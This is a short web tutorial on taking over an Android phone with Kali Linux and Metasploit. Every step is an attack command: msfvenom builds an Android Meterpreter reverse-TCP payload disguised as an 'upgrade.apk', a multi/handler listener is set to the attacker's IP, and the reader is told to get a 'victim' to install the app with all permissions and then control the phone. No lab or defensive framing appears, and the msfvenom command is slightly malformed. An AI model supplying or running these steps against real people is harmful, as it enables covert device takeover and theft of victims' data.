<p style="text-indent: 80">Let us see how to hack android phone and access it using Kali Linux.</p>
<br>
<br>
<p>1. Start up kali linux. For android hacking we need to create a payload apk that the victim should install. To create a payload open terminal and type <br><b>msfvenom android/meterpreter/reverse_tcp LHOST = (ip address of the attacker) R > /root/upgrade.apk</b><br>This will create the payload in the directory</p>

<br>
<p>2. After creating the payload we need to open metasploit framework console which is prebuilt in kali linux. Type <br><b>msfconsole</b><br>The metasploit framework console has many exploits and payloads for every attack. We will need to specify the exploit and the payload.</p>
<br>

<br>
<p>3. In the metasploit framework console type<br><b>use exploit/multi/handler</b><br>This command will specify the exploit that we are going to us in our attack.</p>

<br>
<p>4. Then type <br><b>set payload android/meterpreter/reverse_tcp</b><br>This command will specify the payload that is used in this attack. </p>

<br>
<p>5. Then type<br><b>set LHOST (ip address of the attacker)</b><br>This will set the LHOST to our ip address so that the connections coming from the android phone will reach us.</p>

<br>
<p>6. After completing the above step you need to send your apk to the victim and the victim should install the apk with all the permission, after the victim has installed it you need to exploit it. Type<br><b>exploit</b><br>After exploiting you will be able to see all the android phone that have you payload installed and now you can control them</p>
